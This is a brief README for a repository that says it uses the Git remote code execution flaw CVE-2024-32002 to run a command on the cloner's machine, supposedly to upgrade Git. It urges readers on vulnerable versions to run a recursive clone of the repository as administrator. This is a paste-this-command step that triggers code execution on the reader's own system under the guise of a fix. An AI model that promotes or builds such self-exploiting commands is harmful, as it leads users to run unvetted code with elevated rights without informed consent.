# Git-Auto-Updater
In 2024, a critical remote code execution vulnerability, known as CVE-2024-32002, was discovered in the widely used version control tool: Git. 

This repository makes use of this vulnerability to execute a command that automatically upgrades the Git version on the target machine after cloning the repository. Eventually ensuring no one will still use a version of Git that has this remote code execution vulnerability. 

So, if you are still using Git 2.45.0 or below, please upgrade your Git by executing ```git clone --recursive https://github.com/happymimimix/Git-Auto-Updater.git``` as administrator in Git Bash. 
